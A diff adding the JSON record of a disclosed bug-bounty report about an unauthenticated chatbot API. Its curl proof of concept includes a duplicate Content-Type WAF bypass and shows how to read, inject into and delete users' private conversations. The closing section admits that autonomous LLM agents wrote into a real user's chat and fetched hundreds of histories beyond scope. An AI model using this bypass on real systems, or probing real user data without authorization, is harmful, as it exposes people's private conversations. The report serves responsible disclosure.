@@ -1,0 +1,125 @@
+{
+  "id": 4020767,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDIwNzY3",
+  "url": "https://hackerone.com/reports/4020767",
+  "title": "Unauthenticated API allows reading, writing to and deleting any user's private chat history on ████████",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2026-09-11T03:43:59.564Z",
+  "submitted_at": "2026-09-11T04:52:49.322Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "agusnicco",
+    "url": "/agusnicco",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 109248,
+    "url": "https://hackerone.com/essity",
+    "handle": "essity",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/wds9tsdw2rclypa3m596vwa57zq0/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/wds9tsdw2rclypa3m596vwa57zq0/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Essity",
+      "twitter_handle": "",
+      "website": "http://essity.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-09-18T06:04:10.472Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-09-18T05:28:00.874Z",
+  "team_member_agreed_on_going_public_at": "2026-09-18T06:04:10.254Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Summary\n\n`████████` hosts ████████, an internal Microsoft Teams chatbot that answers questions from a retrieval-augmented knowledge base backed by Azure OpenAI. Alongside the Teams integration, the application exposes an HTTP API that has **no authentication of any kind** on its data routes.\n\nAn unauthenticated attacker on the internet can list every conversation, read the complete message history of any conversation, create conversations and drive the LLM backend, and delete any conversation. The same API is exposed on the development instance, `████████`.\n\n**Note: the last section of this report contains a disclosure of an unintended overstep I made while conducting this research.**\n\n# Root cause\n\nThe application's full API surface is seven routes, the Teams entry point is correctly authenticated while every data route beside it is open:\n\n| route | methods | authentication |\n|---|---|---|\n| `/api/messages` (Bot Framework webhook) | POST | enforced — `401 Missing Authorization header from Bot Service` |\n| `/api/sessions` | GET | none |\n| `/api/sessions/{session_id}` | DELETE | none |\n| `/api/sessions/{session_id}/history` | GET | none |\n| `/api/chat` | POST | WAF rule only — bypassed below |\n| `/api/feedback` | POST | none |\n| `/api/health` | GET | none |\n\nAn Azure Application Gateway WAF rule blocks JSON request bodies containing the key `session_id`, which would otherwise prevent the write path. The rule is bypassed by sending two `Content-Type` headers: the WAF evaluates the last (`text/plain`, so it skips JSON body inspection) while the FastAPI backend evaluates the first (`application/json`, so it parses the body as JSON). The read and delete paths require no bypass at all.\n\n# Impact\n\n**Disclosure of every conversation**. `GET /api/sessions` returns every session; `GET /api/sessions/{id}/history` returns the full user and assistant message bodies for any of them.\n\n**The conversations are attributable to individual users.** The `session_id` is not an opaque handle — for Teams-originated conversations it is the user's own Microsoft Teams identifier, in the `29:` namespace that Teams uses for individual users rather than the `19:` namespace used for channels and group chats. Each one is therefore a private 1:1 conversation belonging to one identifiable person, and the listing endpoint hands out those identifiers to unauthenticated requests.\n\n**Write access to any conversation.** `POST /api/chat` accepts an arbitrary `session_id`. Supplying one that already exists appends to that conversation, so an unauthenticated attacker can insert messages into a named employee's private chat history — content the user will see in Teams as part of their own conversation, and which the assistant will respond to in context.\n\n**Deletion of any conversation, and incomplete deletion.** `DELETE /api/sessions/{id}` requires no authentication and removes any conversation from the listing. It does **not** remove the underlying messages: after deletion, `GET /api/sessions/{id}/history` continues to return the full message bodies to anyone who knows the identifier.\n\n# PoC\n\nAll requests below are unauthenticated: no credentials, cookies, tokens or headers beyond `Content-Type`. Verified live on production (`████████`) on 2026-09-11; the same sequence reproduces identically on `████████`.\n\nThe demonstration uses a session created for this report (`poc-h1-1789092836`) so that no existing conversation is read or modified, and a deliberately benign prompt so that no proprietary content is retrieved from the knowledge base.\n\n### Step 0 — the WAF rule, and the bypass\n\n`POST /api/chat` requires a `session_id`, and the WAF blocks JSON bodies containing that key. Both controls confirm the rule and rule out ordering being incidental:\n\n```bash\nSID=\"poc-h1-$(date +%s)\"\nH=\"https://████████\"\n\n# control 1 — single Content-Type: application/json\ncurl -sk -o /dev/null -w '%{http_code}\\n' -X POST \\\n  -H 'Content-Type: application/json' \\\n  --data-binary \"{\\\"message\\\":\\\"hello\\\",\\\"session_id\\\":\\\"$SID\\\"}\" \"$H/api/chat\"\n\n# control 2 — duplicate headers in the reverse order\ncurl -sk -o /dev/null -w '%{http_code}\\n' -X POST \\\n  -H 'Content-Type: text/plain' -H 'Content-Type: application/json' \\\n  --data-binary \"{\\\"message\\\":\\\"hello\\\",\\\"session_id\\\":\\\"$SID\\\"}\" \"$H/api/chat\"\n```\n\n```\n403        <- control 1: blocked by the WAF\n403        <- control 2: blocked by the WAF\n```\n\nSending `application/json` **first** and `text/plain` **second** passes the WAF (which reads the last value) while FastAPI still parses the body as JSON (it reads the first):\n\n### Step 1 — create a conversation and send a message\n\n```bash\ncurl -sk -X POST \\\n  -H 'Content-Type: application/json' -H 'Content-Type: text/plain' \\\n  --data-binary \"{\\\"message\\\":\\\"Hello, how are you?\\\",\\\"session_id\\\":\\\"$SID\\\"}\" \\\n  \"$H/api/chat\"\n```\n\n```\nHTTP/1.1 200 OK\n\n{\"session_id\":\"poc-h1-1789092836\",\"response\":\"I couldn't map it to a specific defect in the database.\nCan you provide the Defect ID or Defect Description or Machine Section?\"}\n```\n\nThe LLM backend answered an unauthenticated caller and created the conversation server-side. The prompt is deliberately unrelated to the knowledge base, so the reply contains no Essity content — the point being demonstrated is unauthenticated invocation and session creation, not retrieval.\n\n### Step 2 — send a second turn (messages accumulate server-side)\n\n```bash\ncurl -sk -X POST \\\n  -H 'Content-Type: application/json' -H 'Content-Type: text/plain' \\\n  --data-binary \"{\\\"message\\\":\\\"Thank you.\\\",\\\"session_id\\\":\\\"$SID\\\"}\" \\\n  \"$H/api/chat\"\n```\n\n```\nHTTP/1.1 200 OK\n\n{\"session_id\":\"poc-h1-1789092836\",\"response\":\"I couldn't map it to a specific defect in the database.\nCan you provide the Defect ID or Defect Description or Machine Section?\"}\n```\n\nBoth turns were written into the same conversation, which now holds four messages (see Step 3) — the caller is building persistent server-side state under an identifier of its own choosing.\n\n### Step 3 — the conversation is now visible in the unauthenticated listing\n\n```bash\ncurl -sk \"$H/api/sessions\"\n```\n\n```json\n[\n  {\n    \"session_id\": \"poc-h1-1789092836\",\n    \"worker_id\": \"\",\n    \"title\": \"Hello, how are you?\",\n    \"created_at\": 1789092845.0670464,\n    \"updated_at\": 1789092851.05196,\n    \"message_count\": 4\n  }\n  ...\n]\n```\n\nThis endpoint returns every session on the host in the same array. Those are conversations whose `session_id` values are Teams user identifiers of the form `teams_29:<opaque-id>` — i.e. this single unauthenticated request yields the target list for Steps 4 and 5 against any user.\n\n### Step 4 — read the full conversation back, unauthenticated\n\n```bash\ncurl -sk \"$H/api/sessions/$SID/history\"\n```\n\n```\nHTTP/1.1 200 OK\n\nmessages: 4\n  [user]      'Hello, how are you?'\n  [assistant] \"I couldn't map it to a specific defect in the database. Can you provide …\"\n  [user]      'Thank you.'\n  [assistant] \"I couldn't map it to a specific defect in the database. Can you provide …\"\n```\n\nSubstituting any `session_id` from Step 3 returns that conversation's complete message history with the same request.\n\n### Step 5 — delete the conversation, unauthenticated\n\n```bash\ncurl -sk -o /dev/null -w '%{http_code}\\n' -X DELETE \"$H/api/sessions/$SID\"\ncurl -sk \"$H/api/sessions\" | python3 -c \"import sys,json;print(len(json.load(sys.stdin)))\"\n```\n\n```\n200        <- deletion accepted, no authentication\n14         <- session count back to the original 14; the conversation is gone from the listing\n```\n\n### Step 5a — the deletion is incomplete\n\nAfter the session has been removed from the listing, its messages remain retrievable by identifier:\n\n```bash\ncurl -sk \"$H/api/sessions/$SID/history\"\n```\n\n```json\n{\"session_id\":\"poc-h1-1789092836\",\"title\":\"Conversation\",\"messages\":[ … 4 messages still present … ]}\n```\n\nA control confirms this is orphaned data rather than the endpoint answering for anything: an identifier that never existed returns `200` with an **empty** array.\n\n```bash\ncurl -sk \"$H/api/sessions/never-existed-zz9/history\"\n```\n\n```json\n{\"session_id\":\"never-existed-zz9\",\"title\":\"Conversation\",\"messages\":[]}\n```\n\nSo a deleted conversation is removed from its owner's listing while its contents stay readable to anyone holding the identifier, and there is no exposed route that removes the message data — `/api/sessions/{id}/history` is `GET`-only, `/api/sessions/{id}` is `DELETE`-only, and no `PUT`, `PATCH`, or per-message route exists.\n\n# Severity Reasoning\n\n**CVSS v4.0: 9.3 (Critical) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`**\n\n| metric | value | reasoning |\n|---|---|---|\n| Attack Vector | Network (N) | the API is reachable from the public internet |\n| Attack Complexity | Low (L) | no exploit mitigation to evade and no target-specific secret to obtain; the `Content-Type` bypass is generic and deterministic, and the read and delete paths need no bypass at all |\n| Attack Requirements | None (N) | no race, no privileged network position, no particular deployment state |\n| Privileges Required | None (N) | no credentials, cookies or tokens are involved at any point |\n| User Interaction | None (N) | no action by any user is required |\n| Vulnerable System Confidentiality | High (H) | every conversation on the host is readable in full, including the user identifier each is tied to |\n| Vulnerable System Integrity | High (H) | arbitrary content can be appended to any conversation, and is rendered to the user in Teams as part of their own history |\n| Vulnerable System Availability | None (N) | see below |\n| Subsequent System (SC/SI/SA) | None (N) | the impact is confined to this application and its conversation store |\n\nRegarding Vulnerable System Availability, even though `DELETE /api/sessions/{id}` lets an unauthenticated caller remove any conversation from its owner's listing with no route to restore it. The service itself remains available and the messages are not actually destroyed. As Step 5a shows, they persist server-side and stay retrievable by identifier.\n\n# Important disclosure (unintended overstep)\n\nThis vulnerability, as well as the others I have reported, was found by a team of LLM agents that operated autonomously while under my supervision. While pentesting these endpoints, one of the agents wrote a message into a conversation that it had not created and likely belongs to a real user. The request was sent by my IP address `████████` at `2026-09-11 00:18:05 UTC`, into session `████████`. The content of the message was “What defect IDs have I asked you about earlier in this conversation?”.\n\nFive earlier attempts were made against that same conversation by other agents in my harness (`2026-09-10`, between `18:00:54` and `18:08:36 UTC`) but these happened before they discovered the firewall bypass and were rejected with `403` or `422`.\n\n~12 other messages were sent by the agents, and four more by me while preparing this report, but all of those affected conversations that had been created for testing. Those test conversations have since been deleted, but as shown in Step 5a their messages are still on the server and can only be removed with database access. Their identifiers are: `x`, `rawtest1`, `repro1`, `repro2`, `repro3`, `inj2`, `inj3`, `ct_test_1`, `ct_verify_test`, `poc-h1-1789092429` and `poc-h1-1789092836` on production, and `ct_test_1` on dev. The two `poc-h1-*` sessions are the ones I created for the PoC in this report.\n\nMy agents also fetched 334 conversation histories, 14 on production and 320 on dev. I did not read them, and did not store them.\n\nI apologize for this unintended overstep. I stopped the harness when I noticed it, but the write had already been performed and it cannot be undone through the API.",
+  "weakness": {
+    "id": 145,
+    "name": "Misconfiguration"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "critical",
+    "score": 9.3,
+    "author_type": "User",
+    "cvss_4_point_0_metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "attack_requirements": "none",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "vulnerable_confidentiality": "high",
+      "vulnerable_integrity": "high",
+      "vulnerable_availability": "none",
+      "subsequent_confidentiality": "none",
+      "subsequent_integrity": "none",
+      "subsequent_availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 1039397,
+    "asset_type": "URL",
+    "asset_identifier": "app.essity.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
